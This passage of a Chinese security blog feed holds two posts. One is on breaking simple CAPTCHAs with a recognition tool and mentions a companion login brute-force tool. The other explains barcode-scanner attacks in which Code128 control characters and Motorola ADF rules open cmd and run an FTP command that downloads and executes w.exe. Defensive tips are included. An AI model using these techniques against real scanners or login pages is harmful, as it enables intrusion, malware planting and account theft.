-    <content type="html"><![CDATA[<p>注：此文章只适合简单验证码，最后也将编写的工具附上以及关键部分代码和使用说明文档。</p>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>虽然验证码发展到如今有许多人类都难以识别的状态了，但人有部分老系统使用的验证码异常的简单。还有一些网站由于程序员本身的素质或者缺乏相关图像相关的知识，所以并没有自己写验证码的生成程序，而是直接在网上随便复制粘贴一个Demo级别的代码来用，以达到网站有验证码的目的，而忽略了验证码的强弱性，导致很多网站的验证码都是爆款弱验证码。<br>如：</p>
-<p><img src="/images/69145828_1.png" alt="img"></p>
-<p> 还有更糟糕的比如：</p>
-<p><img src="/images/69145828_2.png" alt="img"></p>
-<p>   直接就能复制的…这种是完全不知道验证码的意义或者为了应付而做的验证码</p>
-<h2 id="处理方式"><a href="#处理方式" class="headerlink" title="处理方式"></a>处理方式</h2><p>好吧忽略上面的图继续说。</p>
-<p>对于那些简单验证码他们的共同点是：</p>
-<ol>
-<li>标准字体</li>
-<li>背景单简单甚至纯色没有背景</li>
-<li>字体并没有粘贴在一起<br>而本文讨论的就是这类的验证码。对于那种连背景都没有的纯色、标准字体、没有黏贴的那种再简单不过了，直接就是100%的识别率。</li>
-</ol>
-<p><img src="/images/69145828_3.png" alt="img"></p>
-<p>这种就不讨论了，下面来看看wooyun的验证码。<br> Wooyun的验证码有两种状态：</p>
-<p><img src="/images/69145828_4.png" alt="img"></p>
-<pre><code>一种是白色文字深色背景，一种是黑色文字浅色背景。如果只有一种，无论是那种设定一个阀值都能很好的二值化，但现在的情况却是有两种，所以我能想到的最简单的方式，那好，我就给出两个阀值，对于黑色文字我就用一个较小一点的阀值，对于白色文字我就用一个较大一点的阀值。但是这样还是会出现一个问题，白色文字二值化后背景黑色文字白色 ，而黑色文字二值化后背景白色文字黑色，就像下面一样：
-</code></pre><p><img src="/images/69145828_5.png" alt="img"></p>
-<p>　　可以看出上面我左边框选区域一切正常，而右边却出了问题，那是因为在我写程序的时候，我认为二值化后文字都是黑色背景是白色，所以我就把黑色区域当作文字来框选，就看到了如上的效果。所以说这是一个问题，不仅要二值化，二值化后还要到底白色是文字还是黑色是文字。<br>　　于是我又想到一种办法，通常情况下一张图上背景的面积都会大于文字所占用的面积，所以在二值化的同时我还做了一件事情，二值化的同时记录下黑点个数和白点个数，如果黑点的个数大于了白点的个数，那么我就把黑白反色一下，让黑色像素点变成最少，这样再把黑色像素当作文字处理。</p>
-<p><img src="/images/69145828_6.png" alt="img"></p>
-<p>　　这样做还有一个问题就是，我应该怎么知道什么时候应该使用那一个阀值来二值化，当然办法可以有很多，比如当图像上深色像素多余浅色像素的时候，使用较大阀值，否则相反，不过我并不是这样做的。</p>
-<p><img src="/images/69145828_7.png" alt="img"></p>
-<p>　 　在工具上我提供了一个框，让用户输入验证码的字符个数，这样的话我对体统的阀值挨个遍历，二值化后去识别区域，如果框出来的区域个数是有问题的，那么就换下一个阀值，如果所有阀值都遍历完了还是有问题 ，那么这验证码确实也是超出这个工具的范围了，因为这个工具的目的是通用，对于那些需要单独写代码来识别的不在他的能力范围内。<br>　　在这之前一些验证码可能还需要一些处理，比如很常见的一些验证码有边框的。</p>
-<p><img src="/images/69145828_8.png" alt="img"></p>
-<p>　　左边是没有裁剪的边框，一起被二值化成为了黑色，然后拆字就悲剧了，右边是裁剪掉了一个像素的把边框去掉了，然后就一切正常了，这种情况就不说了，都懂的。<br>　　还有一种比较复杂的情况，因为二值化并不是万能的，并不是说什么验证码一进行二值化后，文字和背景就出来了，下面这张图是我以前程序需要做的百度推广的验证码识别。</p>
-<p><img src="/images/69145828_9.png" alt="img"></p>
-<p>　　上面这张图不怎么能看到效果，因为都是好几年前的事情了，验证码连接访问已经是500了，这张图都是测试的时候的截图。</p>
-<p><img src="/images/69145828_10.png" alt="img"></p>
-<p>　　我描述一下情况吧，上面的验证码，首先有边框、文字、干扰线，即使能把边框裁剪掉，也找不到一个合适的阀值来把线条和文字分离，很简单因为他的线条的颜色比文字的颜色深，如果我的阀值太小，那么我的文字就没有了，只会剩下一些线条在那里。</p>
-<p><img src="/images/69145828_11.png" alt="img"></p>
-<p>　　这图为上面那张图片上验证码的NZ两个字符，在ps中放大的效果(尽管上面图像原来并非保存的png格式已经失真，但大概还是能看到点什么的) 我也去翻了翻以前的代码来看，当初我二值化的时候，并非直接二值化的，在二值化之前还单独对RGB进行了判断，代码截图如下：</p>
-<p><img src="/images/69145828_12.png" alt="img"></p>
-<p>　　百度推广的验证码是我做的第一个验证码识别程序，所以我一直记得很清楚，不是一个二值化就能搞定的，所以说在这个工具中我也加入了同样可以单独处理RGB的功能。<br>　　由于百度的这个验证码已经访问不了了，所以我找了一个同样有线条的验证码，但是这个验证码线条颜色比文字颜色浅，所以我就用默认的127作为阀值，假设二值化无法搞定。</p>
-<p><img src="/images/69145828_13.png" alt="img"></p>
-<p>　　用127阀值上面线条一起被黑化了，但是图片中文字颜色接近黑色，而线条颜色却要浅一点，所以判断的时候，可以认为RGB的平均值大于20的就视为背景，就可以这样干。</p>
-<p><img src="/images/69145828_14.png" alt="img"><br>　　然后效果就成了这样：</p>
-<p><img src="/images/69145828_15.png" alt="img"></p>
-<p>　 　这样线条就被处理掉了，不过这个验证码直接设置阀值就能搞定，只是为了说明，所以采用127作为阀值。还有一点这个验证码和百度的那个他们线条，都是在文字的下方，如果是在文字上方，那么同样的超出了这个工具的范围 ，对于线条在上方的，我想过一些处理方式，假设线条为红色的时候，我在遍历的时候遇到一个红色像素点，我就把红色像素设置为和他相邻像素的非红色的颜色，但是我想了一想这个“相邻”，就涉及了它周围八个像素点，我应该取那一个像素点的颜色。<br>     如果是在背景上还好，他周围应该都是背景的颜色，那一个都无所谓，可是如果是在线条，背景还有文字的交界处就不好处理了，所以工具里面暂时还没提供这样的功能，还有那种很难分离背景或者字黏贴在一起的，但是每个文字都是一个颜色的那种，也想过一些处理方式，但是实现起来我感觉都会存在一些小问题，所以就还展示没有做，就不扯那么多了，等做好了再来扯，才比较有证据。</p>
-<h2 id="拆字和识别"><a href="#拆字和识别" class="headerlink" title="拆字和识别"></a>拆字和识别</h2><pre><code>下面来说说验证码识别中的一个难点 -&gt; 拆字。
-基本上在我看来，能正确的拆字，那么就已经成功了80%了，因为剩下的就是比对的问题了，我在工具中只提供了两种方式拆字。
-</code></pre><p><img src="/images/69145828_16.png" alt="img"></p>
-<pre><code>手动添加就不用说了，我这里的自动识别是最传统的深度遍历，从图像的第一个像素点开始遍历，因为图像已经二值化，按照我的工具的理解 ，就只剩下白色背景和黑色文字，所以遇到一个黑色像素点的时候开始记录，然后开始深度遍历，大概效果如下：
-</code></pre><p><img src="/images/69145828_17.png" alt="img"><br>    　　大概代码如下：</p>
-<p><img src="/images/69145828_18.png" alt="img"></p>
-<pre><code>对于拆字还有很多其他的方式，这里只是最普通的也是最简单的一种，对于其他方式这个工具中并没有提供，因为工具只针对简单通用的验证码，对于那种需要单独写代码的验证码不考虑，而且工具上功能附加太多也就变得复杂了，其实重点就是感觉有点付出和回报不成正比，而且对于那些流传的拆字理论知识，说起来确实简单，但是实际做的时候才会发现，这些理论其实是存在漏洞的，只会在特定条件下才会成立，而验证码却是变幻多端的，这里也就不扯那么多了。
-</code></pre><p>   剩下来的就是识别了，我采用的识别方式比较简单，就是两张图来对比，一张是验证码上面截取出来的图像，一张是已知的样本图像。</p>
-<p><img src="/images/69145828_19.png" alt="img"></p>
-<pre><code>调用函数会返回这两张图的重叠的像素的个数，这样我把截取出来的验证码字符和我所有的样本对比一次，取出nCount最高的一个作为结果，也就是说取出和样本中重叠率最高的一个出来作为结果，在工具中我有两种方式提供样本，一种是使用系统的字体，一种是手动采集。
-</code></pre><p><img src="/images/69145828_20.png" alt="img"></p>
-<pre><code>如果使用系统字体，在文本框内输入验证码可能出现的字符，然后点击生成，会弹出系统对话框设置字体，从而产生样本，不过对于一些非标准字体，系统字体就很难搞定了，无论是标准字体，还是非标准的字体都建议使用手动采集的方式，因为直接从验证码上截取下来的图怎么说也是原配，重复的图片工具也只会采集一次，不会重复添加降低效率比对，下面就是一个非标准字体。
-</code></pre><p><img src="/images/69145828_20.png" alt="img"></p>
-<p>   理论上来说，样本采集越多越全，识别率就越高，反正我每次都是使用的手动采集样本，对了这个工具只是一个配置工具而已，并不能用来做什么其他事情，当一切都配置好了之后，就可以点击工具上的 文件 -&gt; 保存，将这些所有的配置保存成一个文件，可以保存为两种后最(.ci和.ci.png) ，后者以图片保存方便电脑上查看。</p>
-<p><img src="/images/69145828_21.png" alt="img"></p>
-<pre><code>而识别是另一个独立的工具调用，如果是.NET，则直接调用提供的dll来识别，之所以这样设计是因为，我并不知道别人，会用验证码识别来做什么事情，所以除了识别以外，我也不知道别人想要什么功能，所以把所有东西全部独立出来，供别人调用或者使用，对于识别我提供了一个命令行调用工具供给非.NET平台的程序调用。
-</code></pre><p><img src="/images/69145828_22.png" alt="img"></p>
-<pre><code>以python举例：
-</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding: UTF-8</span></div><div class="line">  import os</div><div class="line">  result = os.popen(<span class="string">'verifytool.exe D:\\woo.ci.png -f D:\\woo-verify.png'</span>).readlines()</div><div class="line">  <span class="keyword">print</span> (result)</div><div class="line"> <span class="comment"># coding: UTF-8</span></div><div class="line">   import os</div><div class="line">   result = os.popen(<span class="string">'verifytool.exe D:\\woo.ci.png -f D:\\woo-verify.png'</span>).readlines()</div><div class="line">   <span class="keyword">print</span> (result)</div></pre></td></tr></table></figure>
-<p>在我的D盘有这样一张图：</p>
-<p><img src="/images/69145828_23.png" alt="img"></p>
-<p>这样别人就可以自己写脚本去做自己爱做的事情，不过我还是建议使用-p的方式来调用。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding: UTF-8</span></div><div class="line">  import urllib2</div><div class="line">  from socket import *</div><div class="line">  h = urllib2.urlopen(<span class="string">'http://www.wooyun.org/captcha.php'</span>)</div><div class="line">  str = h.read()                      <span class="comment">#获取验证码</span></div><div class="line">  s = socket(AF_INET,SOCK_DGRAM);</div><div class="line">  s.sendto(str,(<span class="string">'localhost'</span>,<span class="number">14250</span>))   <span class="comment">#将获取到的验证码发送给识别程序</span></div><div class="line">  code = s.recvfrom(<span class="number">65500</span>)            <span class="comment">#接受识别出来的验证码</span></div><div class="line">   <span class="keyword">print</span>(code)</div></pre></td></tr></table></figure></p>
-<p><img src="/images/69145828_24.png" alt="img"></p>
-<pre><code>如果程序是.NET平台编写，则可直接使用VerifyReader.dll文件，将其添加引用然后：
-</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CodeInfo ci = CodeInfo.LoadFromFile(<span class="string">'D:\\woo.ci.png'</span>);</div><div class="line">CodeHelper helper = <span class="keyword">new</span> CodeHelper(ci);</div><div class="line">string code =      helper.GetCodeString(Image.FromFile(<span class="string">'D:\\woo-verify.png'</span>));此处输入代码</div></pre></td></tr></table></figure>
-<p> 另外这里还单独的做了一个账户爆破的工具出来：<br> <img src="/images/69145828_25.png" alt="img"><br> 以下是用自己测试的结果：<br> <img src="/images/69145828_26.png" alt="img"><br> <img src="/images/69145828_27.png" alt="img"><br> 双击列表即可查看数据<br> <img src="/images/69145828_28.png" alt="img"></p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>全套工具及核心代码和使用说明下载连接：<a href="http://down.future-sec.com/VerifyReader-1.1.zip" rel="external nofollow noopener noreferrer" target="_blank">http://down.future-sec.com/VerifyReader-1.1.zip</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;注：此文章只适合简单验证码，最后也将编写的工具附上以及关键部分代码和使用说明文档。&lt;/p&gt;
-&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;虽然验证码发展到如今有许多人类都难以识别的
-    
-    </summary>
-    
-      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="python" scheme="http://www.future-sec.com/tags/python/"/>
-    
-      <category term="验证码" scheme="http://www.future-sec.com/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>一维条形码攻击技术(Badbarcode)</title>
-    <link href="http://www.future-sec.com/badbarcode.html"/>
-    <id>http://www.future-sec.com/badbarcode.html</id>
-    <published>2016-02-24T16:00:00.000Z</published>
-    <updated>2017-07-10T19:39:08.835Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在日常生活中，条形码随处可见，特别在超市，便利店，物流业，但你们扫的条形码真的安全吗？之前TK教主在PacSec介绍的条形码攻<br>击和twitter上的demo视频太炫酷，所以就自己买了个扫码器自己研究了一下 ，在研究时候也找遍了国内外所有资料，但是都没有对可以执行的攻击技术完整的文章，故有此文分享。</p>
-<h2 id="条形码介绍"><a href="#条形码介绍" class="headerlink" title="条形码介绍"></a>条形码介绍</h2><p><img src="/images/N7NjIvr.png" alt="img"><br>条形码(barcode)是将宽度不等的多个黑条和空白，按照一定的编码规则排列，用以表达一组信息的图形标识符。常见的条形码是由反射率相差很大的黑条（简称条）和白条（简称空）排成的平行线图案。<br>常见的条形码类型有code39 code128 code93 EAN128 EAN13QR等，前面大部分是一维条形码，而QR则是二维条形码，本文重点针对支持一维条形码的扫码器。其中code128是使用最广泛，支持字符最多的一种类<br>型，一般都利用code128条形码进行攻击。</p>
-<h2 id="扫码器介绍"><a href="#扫码器介绍" class="headerlink" title="扫码器介绍"></a>扫码器介绍</h2><p><img src="/images/iUrQFz7.png" alt="img"><br>扫码器，大家几乎每天都能看到，在超市付账，物流，医院，彩票等。作用就是把条形码的信息提取出来，而常规的扫码器的工作原理是利用红外线照射，然后反射得出条形码的信息，再用扫描器内置的芯片处理得出结果。国际上常用的扫描器品牌有Symbol，Honeywell，Datalogic等，其中symbol已被摩托罗拉收购。<br>大家在超市购物付账时候都注意到，商品通过扫描后，商品的编码直接显示在屏幕上，其实很多扫码器都是用keyboard的方式输入的，也就是说一个扫描器就相当于一个键盘，这是一个较大的风险。<br><img src="/images/vqu6Rze.png" alt="img"></p>
-<h2 id="Code128条形码"><a href="#Code128条形码" class="headerlink" title="Code128条形码"></a>Code128条形码</h2><p>既然知道扫描器是一个keyboard设备，只要控制条形码的数据就可以随意输入键盘数据了。但例如UPC条形码只支持数字，有些则只支持数字与字母，而Code128 是一种广泛使用的条形码类型，因为它支持ASCII<br>0-127字符，所以叫code128，条形码长度可调，最大支持232个字符。<br>Code128也分为三种：</p>
-<ol>
-<li>Code128A：标准数字和大写字母，控制符，特殊字符</li>
-<li>Code128B：标准数字和大写字母，小写字母，特殊字符</li>
-<li>Code128C/EAN128：[00]-[99]的数字对集合，共100个，即只能表示偶数位长度的数字。<br>Code128由四部分组成:起始码，数据码，校验码(可有可无)，结束码</li>
-</ol>
-<p><img src="/images/mMzyE3v.png" alt="img"></p>
-<p>如上条形码，黑白相间，且线条粗细不一；由黑色线条(条，Bar)与空白(空，Space)组成，根据粗细程度，可以将以上条形码起始码解读<br>为:211214；第一条黑色竖线是由两个单位的竖线合并组成，而第二条空白竖线即由一个单位的竖线，如此类推。一般前6条的Bar与Space为一个单元。211214 用1,0转成逻辑码就是11010010000，也即是起始码。<br>起始码对照：<br>128A 11010000100<br>128B 11010010000<br>128C 11010011100<br> 结束码都是统一的1100011101011根据上面的解读出的逻辑码11010010000，就可以推断上面那个条形码是属于code128-B类型了。</p>
-<p><img src="/images/FNN3Qb3.jpg" alt="img"></p>
-<p><img src="/images/yQnYNj.jpg" alt="img"></p>
-<p>最后再根据code128的编码表就可以分析出条形码的数据（编码表太长就不贴完了）<br>0x04 控制字符与条形码生成<br>根据上面分析的code128规则，已经可以自己写出一个读取识别和生成条形码的程序了。而我们是要执行操作，最简单的就是利用控制字符。控制字符即非显示字符，例如回车，换行，制表符等。在ASCII中，0-31和127 就是控制字符。<br><img src="/images/7nyaEr.jpg" alt="img"><br>根据ASCII的控制字符表，可以看出Ctrl+?的组合键几乎都有了，例如Ctrl+O，也就是打开文件，但这个只是局部快捷组合键，在一些程序<br>中才能应用，例如浏览器，word等等，利用这些控制字符在某些终端可以使程序跳出沙盒。如何生成可以使计算机执行Ctrl+O的条形码？因为已经上面已<br>经介绍过code128的规则算法，自己写程序也可以。网络也有很多条形码生成的小程序，但在这里推荐一个强大的条形码编辑工具：BarTender</p>
-<p><img src="/images/vQjayqi.jpg" alt="img"></p>
-<p>下载安装后点击菜单栏“文件”-“新建”-“完成”，就会出现一个空白模板。</p>
-<p><img src="/images/jUziauY.jpg" alt="img"></p>
-<p>然后点击条形码按钮就可以创建自己的条形码，选择code128类型。</p>
-<p><img src="/images/6zA36nM.jpg" alt="img"></p>
-<p>利用BarTender轻松就可以生成出条形码，而且字符可以随时改动，方便调试。扫描上图就验证码后，会输入“FutureSec”，然后输入控制字符Ctrl+O</p>
-<p><img src="/images/reIN3ye.png" alt="img"></p>
-<p>扫码器扫描后立即弹出对话框<br>市面上基本任何一款扫码器都能执行，因为code128是绝大部分扫码器都支持的。<br>0x05 Advanced Data Formatting（高级数据格式）<br>Advanced Data Formatting（ADF），高级数据格式。是摩托罗拉针对扫描器开发的一种更高级的数据输入，根据自己的设定一步一步的规则可以自定义输入的数据，也可以说是一种支持编程的条形码技术。<br>例如，在一个结账系统中，当你对一个商品扫描后，由于该结账系统不能直接对该条形码直接处理，就需要这种技术。结账系统识别码：A12345，前面要A开头；条形码的数据类型：12345 纯数字，想要在这个结账系统中识别就要在输入前进行处理。<br>再举个例子：<br>条形码的数据：<br>8523647122<br>通过ADF输出的数据：<br>8523641&amp;lt;Enter&amp;gt;<br>如何实现ADF？</p>
-<p><img src="/images/QVreYzQ.png" alt="img"></p>
-<p>现在网上仍然没有ADF的中文资料，而在外国的网站也寥寥无几，无人问津，但靠tk的ppt中提到的ADF也是一头雾水，因为没有具体技术描述，只是一行字带过。后来找到一份摩托罗拉撰写300多页的ADF指南PDF。<br>ADF是一种编程，根据自己的需求构建规则，而用的就不是用代码进行编程而是条形码。ADF把所有规则都用条形码表示，例如Perfix/Suffix，Replace，字符输入等。<br>利用ADF挟持扫描器数据<br>对扫描器进行ADF设置时要先扫描开始模式，Begin New Rule</p>
-<p><img src="/images/6V3yEnR.jpg" alt="img"></p>
-<p>此后开始扫描的条形码都会被添加规则，前提是规则的逻辑是合法的。<br>随后依次扫描下列条形码</p>
-<p><img src="/images/aERbiai.jpg" alt="img"></p>
-<p><img src="/images/uI3QNz.jpg" alt="img"></p>
-<p><img src="/images/ZJrYZj7.jpg" alt="img"></p>
-<p><img src="/images/AVb6Nfa.jpg" alt="img"></p>
-<p>然后Save Rule</p>
-<p><img src="/images/JVne6bV.jpg" alt="img"></p>
-<p>当Save Rule，扫描器的输出数据都会被挟持成“TEST”，当你设置了ADF时，就会把你的规则按流程一步一步执行。<br>如何恢复？</p>
-<p><img src="/images/73iq2i6.jpg" alt="img"></p>
-<p>扫描清除所有规则条形码即可。</p>
-<h2 id="利用ADF执行命令，种植木马"><a href="#利用ADF执行命令，种植木马" class="headerlink" title="利用ADF执行命令，种植木马"></a>利用ADF执行命令，种植木马</h2><p>由于单凭控制字符无法执行命令，而ADF支持简单的编程和更多的键，利用ADF可以轻松执行系统命令。由于ADF支持很多键，例如最有用的WIN+R。<br> 在ADF中称为GUI R，既然知道了可以WIN+R的键，利用上面的规则就可以弹出cmd执行了。但这样还是不行，因为输入的是由系统自动输入，速度是手打无法可比的，当你执行到GUI R，再执行”c”,”m”,”d”， win+r的对话框还没有出来就已经输入了cmd，所有要延时，而ADF就支持，相当于编程中的 sleep()。 </p>
-<p><img src="/images/mMvE3i7.jpg" alt="img"></p>
-<p>在录ADF规则时，扫描延时后要输入两个Numeric，例如依次0和1两个码，就代表延时0.1秒，0和5就代表0.5秒，默认是延时1秒。<br>知道这些ADF条形码后就可以构建弹出cmd，然后再利用控制字符执行命令，主要是Enter。但如果要按照以上这么搞的话，仅是弹出一个cmd窗口就要十多个条形码了，也就是说扫描器要扫十多次。可以先看看腾讯玄武实验室的demo视频：<br><a href="https://twitter.com/tombkeeper/status/663730674017300480" rel="external nofollow noopener noreferrer" target="_blank">https://twitter.com/tombkeeper/status/663730674017300480</a><br>视频中用了一叠条形码，依次扫描，扫描了十多次就出来个cmd，可能这与扫描器型号也有关系。</p>
-<p><img src="/images/3YNNnaV.png" alt="img"></p>
-<p>这样的话不管是规则生成和利用都非常繁琐，其实是可以优化的，ADF的规则可以合并。利用motorola的扫描器。</p>
-<p><img src="/images/7VFVrqu.png" alt="img"></p>
-<p>123scan是摩托罗拉官方出品非常强大的扫描器 管理软件，在其官网可以下载。功能很多，在这里就介绍利用123scan设置ADF。<br>打开后点击”Create new configuration file”-&gt;”My scanner is NOT<br>connected”-&gt;选择扫描器-&gt;”Mondify data”-&gt;”Program complex data modifications”-&gt;”Create a new rule”。</p>
-<p><img src="/images/jM7vaqv.png" alt="img"></p>
-<p>点击Add action就是添加规则。</p>
-<p><img src="/images/qyeyUv7.png" alt="img"></p>
-<p>ADF所有规则都在里面，包括Beep控制（控制扫描器蜂鸣），Replace等。</p>
-<p><img src="/images/r67NVj.png" alt="img"></p>
-<p>设置延时0.5秒，依次添加规则。</p>
-<p><img src="/images/VjEFRzQ.png" alt="img"></p>
-<p>最后会自动合并条形码并输出。</p>
-<p><img src="/images/Jr2aama.png" alt="img"></p>
-<p>以上就是执行任意命令的条形码payload，除去1和2的设置出厂设置和清除所有规则，只需要4个条形码就可以执行任意单条命令。其中Send<br>ALL that remains是代表设置ADF后扫描条形码的原本数据。<br>以上四组条形码的ADF流程是:输入WIN+R键-&gt;延时0.5秒-&gt;输入c键-&gt;输入m键-&gt;输入d键-&gt;输入回车<br>-&gt;延时0.5秒-&gt;执行条形码的内容，而随后的Send ALL that<br>remains就是你要执行的命令，可以多行命令，要是单行命令基本上4条就够不需要加Send ALL that remains。<br>利用ADF种植木马<br>既然已经可以执行cmd命令，最简单的方法就是利用ftp下载执行任意程序。上面提到的Send ALL that remains可以用BarTender生成出FTP命令。</p>
-<p><img src="/images/y6bM7fQ.png" alt="img"></p>
-<pre><code class="php"><span class="comment">#!bash ftp test?CR?a?CR?a?CR?get w.exe?CR?bye?CR?w.exe?CR?get w.exe?CR?bye?CR?w.exe?CR?</span>
-</code></pre>
-<p>下面给出我们的demo视频，是已经经过扫描四次ADF设置后。不管扫描什么条形码执行到Send ALL that remains。视频中是利用FTP命令执行。（测试型号Symbol-LS4208-SR20001ZZR）<br><a href="http://v.youku.com/v_show/id_XMTQ0ODY0ODg1Ng==.html?from=y1.7-1.2" rel="external nofollow noopener noreferrer" target="_blank">http://v.youku.com/v_show/id_XMTQ0ODY0ODg1Ng==.html?from=y1.7-1.2</a><br>密码:wooyun520</p>
-<h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><p>简单总结一下可能存在攻击的场景地点:</p>
-<h3 id="商店付款"><a href="#商店付款" class="headerlink" title="商店付款"></a>商店付款</h3><p><img src="/images/2ErAzu.png" alt="img"></p>
-<p>直接把条形码替换到商品；很多便利店支持微信，支付宝二维码支付，扫描器也支持多个类型条形码，可以直接把条形码存在手机中，让其扫描；有些大型百货有资助价格查询终端，只要用特殊的条形码到终端一扫就能跳出终端。</p>
-<h3 id="医院病历，检验单"><a href="#医院病历，检验单" class="headerlink" title="医院病历，检验单"></a>医院病历，检验单</h3><p><img src="/images/nyUzMva.png" alt="img"></p>
-<p>现在医院的挂号，病历都会有个条形码，直接到医院自主终端或直接递给护士扫描；去医院都知道，有资助出检验单的终端，只要一扫就会单子，基本每个医院都有了。</p>
-<p><img src="/images/NjYRRb6.png" alt="img"></p>
-<h3 id="彩票"><a href="#彩票" class="headerlink" title="彩票"></a>彩票</h3><p><img src="/images/nyeIFre.png" alt="img"></p>
-<p>彩票自身都会有条形码，兑换彩票就凭靠条形码到机器识别，所以伪造或对检验机进行攻击还是有可能，彩票终端类型这么多。</p>
-<p><img src="/images/uUneYn2.png" alt="img"></p>
-<h3 id="快递单子"><a href="#快递单子" class="headerlink" title="快递单子"></a>快递单子</h3><p><img src="/images/FZ7V7zA.png" alt="img"></p>
-<p>快递都有条形码，一般是code128或者code39类型。在一些快递自助取件柜，和快递小哥扫描的时候或许会出现风险。</p>
-<p><img src="/images/M7fA3em.png" alt="img"><br>。。。。。。<br>场景很多就不一一列举了，以上场景有空我会逐一分析。</p>
-<h2 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h2><ol>
-<li>扫码器默认不要开启ADF功能 </li>
-<li>扫描器尽量不要使用键盘模拟 </li>
-<li>设置热键黑名单</li>
-</ol>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一维条形码攻击的概念在国外很多年前就有提出了，但是没人深入研究。利用条形码也可能出现SQL注射，XSS，溢出等攻击。无论什么设备，只要能控制一部分输入，就存在风险！</p>
-<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p> <a href="http://www.appsbarcode.com/code%20128.php" rel="external nofollow noopener noreferrer" target="_blank">http://www.appsbarcode.com/code%20128.php</a> Code 128 條碼．編碼規則<br> <a href="http://www.slideshare.net/mobile/PacSecJP/hyperchem-ma-ba" rel="external nofollow noopener noreferrer" target="_blank">http://www.slideshare.net/mobile/PacSecJP/hyperchem-ma-ba</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在日常生活中，条形码随处可见，特别在超市，便利店，物流业，但你们扫的条形码真的安全吗？之前TK教主在PacSec介绍的条形码攻&lt;br&gt;击和t
-    
-    </summary>
-    
-      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="条形码" scheme="http://www.future-sec.com/tags/%E6%9D%A1%E5%BD%A2%E7%A0%81/"/>
     
   </entry>
   
